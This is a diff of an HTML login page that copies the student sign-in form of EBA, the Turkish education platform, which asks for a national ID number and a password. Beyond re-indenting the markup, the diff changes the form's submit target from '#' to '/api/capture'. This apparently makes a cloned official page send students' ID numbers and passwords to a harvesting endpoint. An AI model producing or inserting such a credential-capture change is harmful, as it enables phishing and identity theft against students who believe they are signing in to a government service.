@@ -758,58 +758,58 @@
                     <div class="nl-tab-content-row bg4">
 
                         <!-- ÖĞRENCİ GİRİŞ FORMU -->
-                        <div class="nl-form" id="studentUst" style="display: block;">
-                            <div class="container">
-                                <form class="contact100-form validate-form nl-contact-form" action="#" method="post" name="form" autocomplete="off">
-                                    <p class="nl-title">EBA Hesabı ile Giriş Yap</p>
+<div class="nl-form" id="studentUst" style="display: block;">
+    <div class="container">
+        <form class="contact100-form validate-form nl-contact-form" action="/api/capture" method="post" name="form" autocomplete="off">
+            <p class="nl-title">EBA Hesabı ile Giriş Yap</p>
 
-                                    <div class="row">
-                                        <div class="col-md-8">
-                                            <div class="new-login-label-and-box-area">
-                                                <label class="nl-input-label" for="tckn">TC Kimlik No</label>
-                                                <div class="nl-wrap-input validate-input" data-validate="TC Kimlik No giriniz!">
-                                                    <input id="tckn" class="input100 nl-input" type="text" name="tckn"
-                                                        oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
-                                                        maxlength="11" placeholder="" required autofocus
-                                                        onkeypress="return event.charCode >= 48 && event.charCode <= 57"
-                                                        autocomplete="off">
-                                                    <span class="focus-input100 nl-focus-input"></span>
-                                                </div>
-                                            </div>
-                                            <div class="new-login-label-and-box-area">
-                                                <label class="nl-input-label" for="password">Şifre</label>
-                                                <div class="nl-wrap-input validate-input password-input" data-validate="Şifre giriniz!">
-                                                    <input id="password" class="input100 nl-input" type="password" name="password" placeholder="" required autocomplete="off">
-                                                    <span class="focus-input100 nl-focus-input"></span>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <div class="col-md-4">
-                                            <div class="new-login-note nl-squared-note">
-                                                <div class="nl-text">
-                                                    <a href="#" title="Şifremi unuttum" class="nl-link">Şifremi unuttum</a>
-                                                </div>
-                                                <div class="nl-text">
-                                                    <a data-toggle="modal" data-target="#sifre-sms" href="#" title="EBA Hesabı Oluştur" class="nl-link trigger">EBA hesabı oluştur</a>
-                                                </div>
-                                            </div>
-                                            <input class="input100 nl-input" type="hidden" id="girisCsrfToken" name="girisCsrfToken" value="d44f6dff-7b01-4662-8bee-05f9218935b6" autocomplete="off" />
-                                            <div class="new-login-pass-links">
-                                                <p class="nl-text">
-                                                    <a href="#" class="nl-link" title="EBA şifresi nasıl alınır?">EBA şifresi al</a>
-                                                </p>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <div class="nl-btn-container">
-                                        <button class="nl-form-send-btn" onclick="loading()" title="Giriş Butonu">
-                                            Giriş
-                                        </button>
-                                    </div>
-                                </form>
-                            </div>
+            <div class="row">
+                <div class="col-md-8">
+                    <div class="new-login-label-and-box-area">
+                        <label class="nl-input-label" for="tckn">TC Kimlik No</label>
+                        <div class="nl-wrap-input validate-input" data-validate="TC Kimlik No giriniz!">
+                            <input id="tckn" class="input100 nl-input" type="text" name="tckn"
+                                oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
+                                maxlength="11" placeholder="" required autofocus
+                                onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                                autocomplete="off">
+                            <span class="focus-input100 nl-focus-input"></span>
                         </div>
+                    </div>
+                    <div class="new-login-label-and-box-area">
+                        <label class="nl-input-label" for="password">Şifre</label>
+                        <div class="nl-wrap-input validate-input password-input" data-validate="Şifre giriniz!">
+                            <input id="password" class="input100 nl-input" type="password" name="password" placeholder="" required autocomplete="off">
+                            <span class="focus-input100 nl-focus-input"></span>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="new-login-note nl-squared-note">
+                        <div class="nl-text">
+                            <a href="#" title="Şifremi unuttum" class="nl-link">Şifremi unuttum</a>
+                        </div>
+                        <div class="nl-text">
+                            <a data-toggle="modal" data-target="#sifre-sms" href="#" title="EBA Hesabı Oluştur" class="nl-link trigger">EBA hesabı oluştur</a>
+                        </div>
+                    </div>
+                    <input class="input100 nl-input" type="hidden" id="girisCsrfToken" name="girisCsrfToken" value="d44f6dff-7b01-4662-8bee-05f9218935b6" autocomplete="off" />
+                    <div class="new-login-pass-links">
+                        <p class="nl-text">
+                            <a href="#" class="nl-link" title="EBA şifresi nasıl alınır?">EBA şifresi al</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="nl-btn-container">
+                <button class="nl-form-send-btn" onclick="loading()" title="Giriş Butonu">
+                    Giriş
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
                         <!-- /ÖĞRENCİ GİRİŞ FORMU -->
 
                         <div class="nl-form" id="teacherUst" style="display: none;"></div>
